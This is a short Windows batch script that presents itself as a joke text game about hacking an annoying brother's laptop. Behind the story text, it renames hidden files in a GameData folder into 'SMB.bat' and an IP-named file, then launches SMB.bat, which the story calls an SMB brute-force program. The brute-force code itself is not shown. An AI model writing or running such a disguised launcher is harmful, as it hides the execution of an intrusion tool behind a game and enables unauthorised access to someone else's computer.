@echo off
title AnnoyYourBrother
echo Welcome to AnnoyYourBrother
echo a simple game coded in bat!

set /p play="Press any key to play: "
if "%play%"=="eq q" (
    goto game
) else (
    goto game
)

:game
cls
echo you hear your little brother scream slurs and rage at random people because he lost a match in CS:GO
echo he tells them he's gonna come to their house and do [REDACTED] to them
echo eventually he logs out of his PC and leaves the house
echo.
echo you feel like evading privacy today...
echo you go into his gaming room
echo (and idk what happens next and you somehow get his laptop's IP and use an SMB Bruteforce program you coded in batch to try and hack into his computer)
cd GameData
cd SourceFiles
rename source.src SMB.bat
rename ip.src 179.57.98.ip
pause
start SMB.bat
exit